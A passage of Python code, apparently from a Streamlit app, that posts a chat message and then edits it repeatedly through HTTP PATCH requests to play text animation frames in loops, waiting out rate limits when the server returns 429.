            first_frame_res = requests.post(edit_url, headers=h, json={"content": frames[0]})
            
            if first_frame_res.status_code == 200:
                msg_id = first_frame_res.json()["id"]
                specific_msg_url = f"{edit_url}/{msg_id}"
                status_placeholder = st.empty()
                
                # Step 2: Loop sequential mutations via HTTP PATCH updates
                for current_loop in range(loop_count):
                    for frame_idx, frame_content in enumerate(frames):
                        status_placeholder.write(f"🎬 Playing: Loop {current_loop + 1}/{loop_count} | Frame {frame_idx + 1}/{len(frames)}")
                        
                        res = requests.patch(specific_msg_url, headers=h, json={"content": frame_content})
                        
                        if res.status_code == 429:
                            retry_after = res.json().get("retry_after", 2.0)
                            status_placeholder.warning(f"⏳ Rate limited. Backing off for {retry_after}s...")
                            time.sleep(retry_after)
                        
                        time.sleep(frame_delay)
                
                status_placeholder.success("✨ Animation sequence finished running successfully!")
            else:
                st.error(f"Failed to initiate animation link pipeline: {first_frame_res.text}")
